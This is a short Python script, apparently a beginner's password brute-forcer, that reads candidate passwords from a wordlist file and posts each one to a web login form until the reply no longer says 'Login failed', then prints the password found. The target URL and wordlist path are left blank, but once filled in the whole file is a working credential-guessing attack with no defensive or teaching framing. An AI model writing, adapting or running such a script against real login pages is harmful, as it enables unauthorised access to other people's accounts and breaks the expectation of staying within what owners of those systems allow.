#!/usr/bin/env python
import requests

data = {"username": "username", "password": "", "Loign": "submit"}
url = ""

with open("address to pass file", "r") as file:
    for line in file:
        word = line.strip()
        data["password"] = word
        res = requests.post(url, data=data)
        if "Login failed" not in res.content:
            print("Found password ->" + word)
            exit()
